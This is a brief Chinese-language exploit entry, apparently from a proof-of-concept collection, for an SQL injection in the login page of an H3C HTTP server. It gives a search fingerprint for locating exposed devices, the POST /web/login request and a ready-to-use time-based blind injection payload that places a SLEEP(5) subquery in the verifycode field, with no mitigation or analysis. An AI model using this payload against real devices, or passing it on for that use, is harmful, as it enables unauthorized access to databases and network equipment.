# H3CHTTP服务器login存在SQL注入漏洞

H3CHTTP ｜ SQL注入 ｜ —
- **指纹**：`server="H3C httpd"`
- **请求**：`POST /web/login HTTP/1.1`

**Payload**
```
user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(5)))dfpe) AND 'dYCM'='&language=0
```
- **响应特征**：200